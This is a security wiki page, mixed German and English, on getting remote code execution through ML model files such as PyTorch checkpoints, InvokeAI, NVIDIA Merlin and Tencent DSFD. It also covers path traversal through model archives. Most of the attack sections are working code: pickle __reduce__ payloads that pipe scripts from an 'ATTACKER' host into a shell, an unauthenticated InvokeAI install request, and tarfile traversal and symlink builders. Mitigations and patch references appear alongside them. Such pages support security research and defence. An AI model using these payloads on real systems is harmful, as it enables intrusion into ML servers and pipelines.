# Modelle RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laden für RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerabilität (CVE falls verfügbar)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Bösartiges pickle im Model-Checkpoint führt zu Codeausführung (Umgehung der `weights_only`-Sicherung)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + bösartiger Model-Download verursacht Codeausführung; Java-Deserialisierungs-RCE in der Management-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint-Deserialisierung via `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauenswürdiger Checkpoint löst den Pickle-Reducer während `load_model_trainer_states_from_checkpoint` aus → Codeausführung im ML-Worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Laden eines Modells mit **Lambda**-Layer führt beliebigen Python-Code aus          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Manipuliertes `.tflite`-Modell löst Integer-Overflow aus → Heap-Korruption (potenzielles RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Das Laden eines Modells via `joblib.load` führt Pickle mit der `__reduce__`-Payload des Angreifers aus                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                              | `numpy.load` erlaubte standardmäßig pickled Object-Arrays – bösartige `.npy/.npz` löst Codeausführung aus                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Verzeichnis-Traversal) <br> **CVE-2024-5187** (Tar-Traversal)                                                    | Der external-weights-Pfad eines ONNX-Modells kann das Verzeichnis verlassen (beliebige Dateien lesen) <br> Bösartiges ONNX-Modell-Tar kann beliebige Dateien überschreiben (führt zu RCE) | |
| ONNX Runtime (design risk)  | *(Kein CVE)* ONNX custom ops / control flow                                                                                    | Modelle mit custom-Operatoren erfordern das Laden nativen Codes des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuführen   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Pfad-Traversal)                                                                                          | Die Verwendung der model-load-API mit aktivierter `--model-control` erlaubt relative Pfad-Traversal zum Schreiben von Dateien (z. B. Überschreiben von `.bashrc` für RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (mehrere Heap-Overflows)                                                                         | Fehlerhafte GGUF-Modell-Datei verursacht Heap-Buffer-Overflows im Parser, ermöglicht beliebige Codeausführung auf dem Opfer-System                     | |
| **Keras (older formats)**   | *(Kein neuer CVE)* Legacy Keras H5 model                                                                                         | Bösartiges HDF5 (`.h5`) Modell mit Lambda-Layer-Code wird beim Laden weiterhin ausgeführt (Keras safe_mode deckt altes Format nicht ab – „Downgrade-Angriff”) | |
| **Others** (general)        | *Designfehler* – Pickle-Serialisierung                                                                                         | Viele ML-Tools (z. B. Pickle-basierte Modellformate, Python `pickle.load`) führen eingebetteten beliebigen Code in Modell-Dateien aus, sofern nicht mitigiert | |

Zudem gibt es einige python-pickle-basierte Modelle wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die dazu verwendet werden können, beliebigen Code auf dem System auszuführen, wenn sie nicht mit `weights_only=True` geladen werden. Daher können beliebige pickle-basierte Modelle besonders anfällig für diese Art von Angriffen sein, auch wenn sie nicht in der obigen Tabelle aufgeführt sind.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, der es Nutzern erlaubt, Modelle von beliebigen URLs herunterzuladen und zu laden.

Intern ruft der Endpunkt schließlich auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die bereitgestellte Datei ein **PyTorch checkpoint (`*.ckpt`)** ist, führt `torch.load` eine **pickle deserialization** durch. Da der Inhalt direkt von der user-controlled URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in das Checkpoint einbetten; die Methode wird **during deserialization** ausgeführt, was zu **remote code execution (RCE)** auf dem InvokeAI server führt.

Die Schwachstelle wurde **CVE-2024-12029** zugewiesen (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Stelle `payload.ckpt` auf einem HTTP-Server bereit, den du kontrollierst (z. B. `http://ATTACKER/payload.ckpt`).
3. Trigger das verwundbare endpoint (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.

#### Bedingungen

•  InvokeAI 5.3.1-5.4.2 (scan-Flag standardmäßig **false**)  
•  `/api/v2/models/install` vom Angreifer erreichbar  
•  Der Prozess hat Berechtigungen, Shell-Befehle auszuführen

#### Gegenmaßnahmen

* Auf **InvokeAI ≥ 5.4.3** aktualisieren – der Patch setzt `scan=True` standardmäßig und führt Malware-Scans vor der Deserialisierung durch.  
* Beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` verwenden oder die neue [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) Hilfsfunktion nutzen.  
* Erzwingen Sie Allow-Lists / Signaturen für Modellquellen und betreiben Sie den Dienst mit geringsten Privilegien.

> ⚠️ Denken Sie daran, dass **jedes** auf Python-Pickle basierende Format (einschließlich vieler `.pt`, `.pkl`, `.ckpt`, `.pth` Dateien) inhärent unsicher ist, wenn es von nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Gegenmaßnahme, falls Sie ältere InvokeAI-Versionen hinter einem Reverse-Proxy betreiben müssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE durch unsicheres `torch.load` (CVE-2025-23298)

NVIDIAs Transformers4Rec (Teil von Merlin) enthielt einen unsicheren Checkpoint-Loader, der direkt `torch.load()` auf benutzerbereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter Checkpoint während der Deserialisierung über einen Reducer beliebigen Code ausführen.

Verwundbarer Pfad (vor Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum das zu RCE führt: Im Python-pickle kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der ein callable und Argumente zurückgibt. Das callable wird während des Unpicklings ausgeführt. Wenn ein solches Objekt in einem Checkpoint vorhanden ist, läuft es, bevor irgendwelche Gewichte verwendet werden.

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models, die über repos, buckets oder artifact registries geteilt werden
- Automatisierte resume/deploy pipelines, die Checkpoints automatisch laden
- Die Ausführung findet innerhalb von training/inference workers statt, oft mit erhöhten Rechten (z. B. root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte das direkte `torch.load()` durch einen eingeschränkten, allow-listed Deserializer, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass willkürliche callables während des Ladevorgangs aufgerufen werden.

Defensive guidance specific to PyTorch checkpoints:
- Unpickle keine nicht vertrauenswürdigen Daten. Bevorzugen Sie nicht-exekutierbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX, wenn möglich.
- Wenn Sie PyTorch-Serialization verwenden müssen, stellen Sie sicher, dass `weights_only=True` (unterstützt in neueren PyTorch-Versionen) oder verwenden Sie einen benutzerdefinierten allow-listed unpickler ähnlich dem Transformers4Rec-Patch.
- Erzwingen Sie Model-Provenance/Signaturen und sandboxen Sie die Deserialisierung (seccomp/AppArmor; non-root user; eingeschränktes FS und kein network egress).
- Überwachen Sie beim Laden von Checkpoints auf unerwartete Child-Prozesse von ML-Services; trace `torch.load()`/`pickle`-Nutzung.

POC and vulnerable/patch references:
- Verwundbarer Pre-Patch-Loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Modell laden:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialisierung Tencent FaceDetection-DSFD `resnet` (CVE-2025-13715 / ZDI-25-1183)

Tencents FaceDetection-DSFD stellt einen `resnet`-Endpoint bereit, der von Benutzern kontrollierte Daten deserialisiert. ZDI bestätigte, dass ein entfernter Angreifer ein Opfer dazu bringen kann, eine bösartige Seite/Datei zu laden, diese ein speziell gestaltetes serialisiertes blob an diesen Endpoint senden zu lassen und dadurch die Deserialisierung als `root` auszulösen, was zur vollständigen Kompromittierung führt.

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## Modelle zu Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

Zum Beispiel können Sie mit dem folgenden Code ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` anlegt:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder, mit dem folgenden Code kannst du ein Modell erstellen, das beim Laden einen symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Tiefenanalyse: Keras .keras deserialization and gadget hunting

Für einen fokussierten Leitfaden zu .keras-Interna, Lambda-layer RCE, dem arbitrary import issue in ≤ 3.8 und der post-fix gadget discovery innerhalb der allowlist siehe:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## Referenzen

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialisierung von nicht vertrauenswürdigen Daten"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit-Moduldokumentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – Sicherheitsüberlegungen für torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI Advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
